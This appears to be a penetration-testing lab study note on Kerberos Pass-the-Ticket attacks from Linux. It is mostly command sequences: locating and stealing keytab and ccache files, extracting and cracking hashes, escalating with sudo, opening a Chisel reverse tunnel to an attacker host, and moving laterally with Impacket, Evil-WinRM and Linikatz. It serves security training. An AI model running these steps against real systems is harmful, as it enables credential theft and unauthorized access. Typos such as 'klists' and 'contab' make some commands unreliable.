# Pass the Ticket Linux

- [Keytab](https://kb.iu.edu/d/aumh) files
- [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)

#### Linux auth via port forward

```bash
ssh david@example.com@10.129.204.23 -p 2222

# Check domain/kerberos information
realm list

# If unavailable check for sssd or winbind
ps -ef | grep -i "winbind\|sssd"
```

## Finding KeyTab files

- [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos
- Ticket is represented as a keytab file located by default at `/etc/krb5.keytab`

```bash
# Using find - Mus have r/w priv
find / -name *keytab* -ls 2>/dev/null

# Check crontab for kinit if keys have been renamed
crontab -l
```

### Finding ccache files

- credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)
- Remain valid while the users session lasts
- File path is the `KRB5CCNAME` environment variable
- As root or priv, impersonate a user using their `ccache` file while it is still valid

```bash
# Check file path
env | grep -i krb5
```

### Abusing KeyTab files - Shared folders

Impersonate a user using `kinit`.

```bash
# Confirm ticket being used
klist

# Impersate user Carlos
klist -k -t /opt/specialfiles/carlos.keytab

# Connect to smb share as Carlos
smbclient //dc01/carlos -k -c ls
```

> To keep the ticket from the current session, before importing the  keytab, save a copy of the ccache file present in the environment  variable `KRB5CCNAME`.

---

## KeyTab Extract - Secrets

Abuse Kerberos and extract secrets from keytab file.

### Extracting KeyTab hashes with [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

- use John/Hashcat or [CrackStation](https://crackstation.net/)

The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.

```bash
# Get hashes
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

# Crack with your flavour and login
su - carlos@example.com

# Attempt lat movement
klists
contab -l

# Find .kt file and crack
python3 /opt/keytabextract.py /home/carlos@example.com/.scripts/svc_workstations.kt

```

- Check crontab and klists again to attempt lateral movement; srv accouts or user with sudo priv

> With the NTLM hash, we can perform a Pass the Hash attack. With the  AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt  to crack the hashes to obtain the plaintext password.

## Abusing KeyTab ccache

Once we have read permission to the ccache in `/tmp` with sudo permission we can abuse

```bash
# Privesc to root
ssh svc_workstations@example.com@10.129.204.23 -p 2222
sudo -l
sudo su; whoami

#

# Looking for ccache files
ls -la /tmp

# Identifying group membership and look for admins
id julio@example.com
```

### Importing the ccache file into our current session

To use a ccache file, copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

```bash
# Check and export
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133

# Verify and ls machine
klist
smbclient //dc01/C$ -k -c ls -no-pass
```

> klist displays the ticket information. We must consider the values  "valid starting" and "expires." If the expiration date has passed, the  ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

---

## Using Linux attack tools with Kerberos

To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

### [Chisel](https://github.com/jpillora/chisel)

#### Host file and Proxychains

```bash
cat /etc/hosts

# Host addresses
172.16.1.10 example.com   inlanefreight   dc01.example.com  dc01
172.16.1.5  ms01.example.com  ms01

cat /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

#### Download Chisel to attack box

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```

#### Connect to RDP and execute chisel

```bash
xfreerdp /v:10.129.204.23 /u:david /d:example.com /p:Password2 /dynamic-resolution
```

```cmd
# Client IP is attack box
chisel.exe client 10.10.14.33:8080 R:socks
```

Transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file. See 02_Access/File-Transfers.

```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Impacket

To use the Kerberos ticket, specify our target machine name (not the IP address) and use the option `-k`. If prompted for a password, include the option `-no-pass`.

```bash
proxychains impacket-wmiexec dc01 -k
```

### [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

Install the Kerberos package used for network authentication `krb5-user`. Will prompt for domain and computer name. If installed change the configuration file `/etc/krb5.conf`.

```bash
# Install package
sudo apt-get install krb5-user -y

# Launch
proxychains evil-winrm -i dc01 -r example.com
```

### [Linikatz](https://github.com/CiscoCXSecurity/linikatz) - Move lateraly

> Bringing Mimikatz et al to UNIX". In addition to the main linikatz.sh  script, this also includes auditd policies, John the Ripper rules,  Metasploit post-exploitation modules and fuzzers. 

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
./linikatz.sh

# Find compute keytab file with access to other systems
./linikatz

# Initialize
kinit LINUX01$ -k -t /path/to/keytab

# Get whatever
smbclient //dc01/linux01 -k -c 'get /flag.txt /root/flag.txt'
```



